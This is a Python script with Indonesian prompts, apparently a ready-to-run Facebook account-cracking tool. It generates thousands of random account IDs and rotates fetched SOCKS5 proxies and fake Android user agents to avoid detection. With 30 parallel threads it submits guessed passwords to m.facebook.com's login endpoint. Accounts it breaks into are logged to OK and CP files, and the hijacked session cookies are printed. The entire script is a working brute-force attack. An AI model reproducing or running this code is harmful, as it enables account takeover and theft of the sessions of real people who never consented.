#!/usr/bin/python3
# -*- coding: utf-8 -*-


import os
try:
    import requests
except ImportError:
    os.system('pip install requests' if os.name == 'nt' else 'pip install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip install futures' if os.name == 'nt' else 'pip install futures')
try:
    from bs4 import BeautifulSoup
except ImportError:
    os.system('pip install bs4' if os.name == 'nt' else 'pip install bs4')
try:
    import rich
except ImportError:
    os.system('pip install rich' if os.name == 'nt' else 'pip install rich')

import requests, re, os, random, sys,bs4,time
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup
from random import choice
from concurrent.futures import ThreadPoolExecutor as upil
from datetime import date
from datetime import datetime
from urllib.parse import quote
from platform import platform
from rich import print as prints
from rich.panel import Panel
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
kuning = '[#FFFF00]'
hapus  = '[/]'
biru_m = '[bold cyan]'
warna_rich = random.choice(["[bold red]","[deep_pink3]","[blue]","[green]","[cyan]"])
warna = random.choice(["[deep_pink3]","[green]","[cyan]","[blue]"])
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
 	if n < 0 or n > 12:
 		exit()
 	nTemp = n - 1
except ValueError:
 	exit()
current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m' #
ta = current.year
bu = current.month
ha = current.day
op = bulan_[nTemp]
tanggal = '%s-%s-%s'%(ha,op,ta)
tanggal.split('/')
ses=requests.session()
loop = 0
id = []
ok = []
cp = []
pwx= []
ugen=[]
ugen2=[]
ua1=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mCluuuut')
prox=open('.prox.txt','r').read().splitlines()


for jiah in range(1000):
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5','6','7','8','9','10','11','12'])
	c='SM-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(100, 9999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	i=random.randrange(90,103)
	j='0'
	k=random.randrange(2100,5900)
	l=random.randrange(40,200)
	m='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {h}{i}.{j}.{k}.{l} {m}'
	ugen.append(uaku2)

for jiah in range(1000):
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5','6','7','8','9','10','11','12'])
	c='SAMSUNG SM-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(100, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/'
	h=random.choice(['15','16','17','18'])
	i='.0 Chrome/'
	j=random.randrange(83,103)
	k='0'
	l=random.randrange(2100,4900)
	m=random.randrange(50,100)
	n='Mobile Safari/537.36'
	uaku4=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}{i}{j}.{k}.{l}.{m} {n}'
	ugen2.append(uaku4)

def folder():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	jadul()
	
def save_agent(_agent):
	_choic=input("\033[0m * simpan user agent? y/t : ")
	if _choic in ['ya', 'y', 'Y']:
		with open('agent.txt', 'w') as f:
			f.write(_agent)
			f.close()
			return
	elif _choic in ['t', 'T']:
		return

def real_time():
	from time import time
	return str(time()).split('.')[0]

def banner():
	prints("""
		█▀▀ █▀█ ▄▀█ █▀▀ █▄▀
		█▄▄ █▀▄ █▀█ █▄▄ █░█

      █████████████████████████████████████
      █▄─▄▄▄▄█▄─▄████▄─▄▄─█▄─▄█▄─▄▄▀██▀▄─██
      ██─▄▄████─██▀███─▄████─███─▄─▄██─▀─██
      █▄▄▄▄▄▄▄█▄▄▄▄██▄▄▄███▄▄▄██▄█▄▄██▄█▄██ \n""")



def jadul():
	os.system('clear');banner()
	try:
		os.mkdir('sempak')
	except:pass
	try:
		os.system('rm -rf sempak/id.txt')
		print(" * contoh target : 21,250 dll")
		ay = input(' * angka target  : ').split(',')
		p = open('sempak/id.txt', 'a')
		try:
			for ae in ay:
				for k in range(4999):
					us = random.randint(1111, 9999)
					aa = ae.lower()
					p.write("\r%s%s"%(aa,us))
					sys.stdout.flush()
			p.close()
		except (KeyError,IOError):
			input(' * [ \033[1;31menter untuk kembali ke target\033[0m ] ')
			jadul()
	except (KeyError, IOError):
		exit(" * anda error, ngewe yuk ")
	old()

def old():
	global prog,des
	try:
		idk = ('sempak/id.txt')
		for line in open(idk, 'r').readlines():
			id.append(line.strip())
	except:
		print (' * File [\033[1;31m %s \033[0m] Tidak ada '%(idk))
		time.sleep(3)
		old()
	print(" * total id      : %s"%(len(id)))
	pwx=input(" * tebak sandi   : ")
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with upil(max_workers=30) as laura:
			print("");prints(Panel('[bold green] * OK tersimpan di file : %s \n * CP tersimpan di file : %s'%(tanggal,tanggal)));print("")
			for ids in id:
				try:
					uid=ids.split(' ')[0]
					laura.submit(browser, uid, pwx.split(','))
				except requests.exceptions.ConnectionError:pass
				except Exception as e:os.sys.exit(e)
				except:pass
		exit("\n * crack selesei...\n")

def lite(user,pwx,url):
		global loop,ok,cp
		prog.update(des,description=f"{str(loop)}/{len(id)} OK[[bold yellow]{len(ok)}{N}][/]-CP[[bold yellow]{len(cp)}{N}][/]")
		prog.advance(des)
		uaa=random.choice(ugen2)
		nip=random.choice(prox)
		proxs= {'http': 'socks5://'+nip}
		ses=requests.session()
		for pw in pwx:
			head1={
				'Host':'m.facebook.com',
				'cache-control':'max-age=0',
				'accept-language':'id-ID,id,en-US,en',
				'upgrade-insecure-requests':'1',
				'user-agent':uaa,
				'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-site':'none',
				'sec-fetch-mode':'navigate',
				'sec-fetch-user':'?1',
				'sec-fetch-dest':'document',
				'accept-encoding':'gzip, deflate, br'
			}
			try:
				r=ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=585294182497851&kid_directed_site=0&app_id=585294182497851&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D585294182497851%26redirect_uri%3Dhttps%253A%252F%252Fnow.gg%252Faccounts%252Fauth%252Fv1%252F_authhandler%252Ffacebook%26response_type%3Dcode%26scope%3Dpublic_profile%2Bemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9db63ac9-be8b-4789-ab7d-09d414b299f7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fnow.gg%2Faccounts%2Fauth%2Fv1%2F_authhandler%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text.encode('utf-8')
			except:
				r=ses.get('https://m.facebook/login.php?skip_api_login=1&api_key=585294182497851&kid_directed_site=0&app_id=585294182497851&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D585294182497851%26redirect_uri%3Dhttps%253A%252F%252Fnow.gg%252Faccounts%252Fauth%252Fv1%252F_authhandler%252Ffacebook%26response_type%3Dcode%26scope%3Dpublic_profile%2Bemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9db63ac9-be8b-4789-ab7d-09d414b299f7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fnow.gg%2Faccounts%2Fauth%2Fv1%2F_authhandler%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			date = {"lsd": re.search('name="lsd" value="(.*?)"',str(r)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"',str(r)).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',str(r)).group(1), "li": re.search('name="li" value="(.*?)"',str(r)).group(1), "try_number": "0", "unrecognized_tries": "0", "email": user, "pass": pw}
			head2={
				'Host':'m.facebook.com',
				'content-length':'2137',
				'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(r)).group(1),
				'user-agent':uaa,
				'content-type':'application/x-www-form-urlencoded',
				'accept':'*/*',
				'origin':'https://m.facebook.com',
				'sec-fetch-site':'same-origin',
				'sec-fetch-mode':'cors',
				'sec-fetch-dest':'empty',
				'referer':'https://m.facebook.com/login.php?skip_api_login=1&api_key=585294182497851&kid_directed_site=0&app_id=585294182497851&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D585294182497851%26redirect_uri%3Dhttps%253A%252F%252Fnow.gg%252Faccounts%252Fauth%252Fv1%252F_authhandler%252Ffacebook%26response_type%3Dcode%26scope%3Dpublic_profile%2Bemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9db63ac9-be8b-4789-ab7d-09d414b299f7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fnow.gg%2Faccounts%2Fauth%2Fv1%2F_authhandler%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
				'accept-encoding':'gzip, deflate, br',
				'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			}
			p=ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=585294182497851&auth_token=c424b4f341aba8c00107f61489ea6ed8&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D585294182497851%26redirect_uri%3Dhttps%253A%252F%252Fnow.gg%252Faccounts%252Fauth%252Fv1%252F_authhandler%252Ffacebook%26response_type%3Dcode%26scope%3Dpublic_profile%2Bemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9db63ac9-be8b-4789-ab7d-09d414b299f7%26tp%3Dunspecified&refsrc=deprecated&app_id=585294182497851&cancel=https%3A%2F%2Fnow.gg%2Faccounts%2Fauth%2Fv1%2F_authhandler%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&lwv=100', data=date,headers=head2, proxies=proxs, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				cok = ses.cookies.get_dict()
				koki=('datr='+cok['datr'])+';'+('c_user='+cok['c_user'])+';'+('fr='+cok['fr'])+';'+('xs='+cok['xs'])
				print("\r *\033[1;34m OK 》%s | %s | %s \n\033[0m * %s"%(user,pw,koki,uaa))
				ok.append("%s|%s"%(user, pw))
				open("OK/%s.txt"%(tanggal),"a").write(" * %s|%s\n"%(user, pw))
				break
			elif "checkpoint" in ses.cookies.get_dict():
				print("\r * \033[1;93mCP 》 %s | %s \n\033[0m * \033[1;96mUSER AGENT : \033[1;31m%s \033[0m"%(user,pw,uaa))
				cp.append("%s|%s"%(user, pw))
				open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
				break
			else:
				continue
		loop+=1

def browser(user,pwx):
		global ok,cp,loop
		prog.update(des,description=f"{str(loop)}/{len(id)} OK[[bold blue]{len(ok)}{N}][/]-CP[[bold yellow]{len(cp)}{N}][/]")
		prog.advance(des)
		uaa=random.choice(ugen)
		nip=random.choice(prox)
		proxs= {'http': 'socks5://'+nip}
		ses=requests.session()
		for pw in pwx:
			head1={
				'Host':'m.facebook.com',
				'cache-control':'max-age=0',
				'sec-ch-ua':'".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
				'sec-ch-ua-mobile':'?1',
				'sec-ch-ua-platform':'"Android"',
				'upgrade-insecure-requests':'1',
				'user-agent':uaa,
				'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-site':'none',
				'sec-fetch-mode':'navigate',
				'sec-fetch-user':'?1',
				'sec-fetch-dest':'document',
				'accept-encoding':'gzip, deflate, br',
				'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			}
			r=ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1443497502442589&kid_directed_site=0&app_id=1443497502442589&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1443497502442589%26cbt%3D1660932906093%26e2e%3D%257B%2522init%2522%253A1660932906093%257D%26ies%3D0%26sdk%3Dandroid-12.3.0%26sso%3Dchrome_custom_tab%26nonce%3D99cc4c74-0328-4c11-9c25-13fb59be59d9%26scope%3Duser_birthday%252Cpublic_profile%252Cuser_friends%252Cemail%252Copenid%26state%3D%257B%25220_auth_logger_id%2522%253A%25226080d13f-da4d-44f0-850d-4918825b7ba8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522vdch2rl8456gloh1l6ld%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.yy.hiyo%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6080d13f-da4d-44f0-850d-4918825b7ba8%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.yy.hiyo%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25226080d13f-da4d-44f0-850d-4918825b7ba8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522vdch2rl8456gloh1l6ld%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			date = {"lsd": re.search('name="lsd" value="(.*?)"',str(r)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"',str(r)).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',str(r)).group(1), "li": re.search('name="li" value="(.*?)"',str(r)).group(1), "try_number": "0", "unrecognized_tries": "0", "email": user, "pass": pw}
			head2={
				'Host':'m.facebook.com',
				'content-length':'2139',
				'x-fb-lsd':re.search('name="lsd" value="(.*?)"',str(r)).group(1),
				'user-agent':uaa,
				'content-type':'application/x-www-form-urlencoded',
				'accept':'*/*',
				'origin':'https://m.facebook.com',
				'sec-fetch-site':'same-origin',
				'sec-fetch-mode':'cors',
				'sec-fetch-dest':'empty',
				'referer':'https://m.facebook.com/login.php?skip_api_login=1&api_key=1443497502442589&kid_directed_site=0&app_id=1443497502442589&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1443497502442589%26cbt%3D1660932906093%26e2e%3D%257B%2522init%2522%253A1660932906093%257D%26ies%3D0%26sdk%3Dandroid-12.3.0%26sso%3Dchrome_custom_tab%26nonce%3D99cc4c74-0328-4c11-9c25-13fb59be59d9%26scope%3Duser_birthday%252Cpublic_profile%252Cuser_friends%252Cemail%252Copenid%26state%3D%257B%25220_auth_logger_id%2522%253A%25226080d13f-da4d-44f0-850d-4918825b7ba8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522vdch2rl8456gloh1l6ld%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.yy.hiyo%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6080d13f-da4d-44f0-850d-4918825b7ba8%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.yy.hiyo%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25226080d13f-da4d-44f0-850d-4918825b7ba8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522vdch2rl8456gloh1l6ld%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
				'accept-encoding':'gzip, deflate, br',
				'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			}
			p=ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1443497502442589&auth_token=a794548c8b3a94b96585857f8d73e201&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1443497502442589%26cbt%3D1660932906093%26e2e%3D%257B%2522init%2522%253A1660932906093%257D%26ies%3D0%26sdk%3Dandroid-12.3.0%26sso%3Dchrome_custom_tab%26nonce%3D99cc4c74-0328-4c11-9c25-13fb59be59d9%26scope%3Duser_birthday%252Cpublic_profile%252Cuser_friends%252Cemail%252Copenid%26state%3D%257B%25220_auth_logger_id%2522%253A%25226080d13f-da4d-44f0-850d-4918825b7ba8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522vdch2rl8456gloh1l6ld%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.yy.hiyo%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6080d13f-da4d-44f0-850d-4918825b7ba8%26tp%3Dunspecified&refsrc=deprecated&app_id=1443497502442589&cancel=fbconnect%3A%2F%2Fcct.com.yy.hiyo%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25226080d13f-da4d-44f0-850d-4918825b7ba8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522vdch2rl8456gloh1l6ld%2522%257D&lwv=100', data=date,headers=head2, proxies=proxs, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				cok = ses.cookies.get_dict()
				koki=('datr='+cok['datr'])+';'+('c_user='+cok['c_user'])+';'+('fr='+cok['fr'])+';'+('xs='+cok['xs'])
				print("\r *\033[1;34m OK 》%s | %s | %s \n\033[0m * %s"%(user,pw,koki,uaa))
				ok.append("%s|%s"%(user, pw))
				open("OK/%s.txt"%(tanggal),"a").write(" * %s|%s\n"%(user, pw))
				break
			elif "checkpoint" in ses.cookies.get_dict():
				print("\r * \033[1;93mCP 》 %s | %s \n\033[0m * \033[1;96mUSER AGENT : \033[1;31m%s \033[0m"%(user,pw,uaa))
				cp.append("%s|%s"%(user, pw))
				open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
				break
			else:
				continue

		loop+=1

if __name__=='__main__':
	 folder()
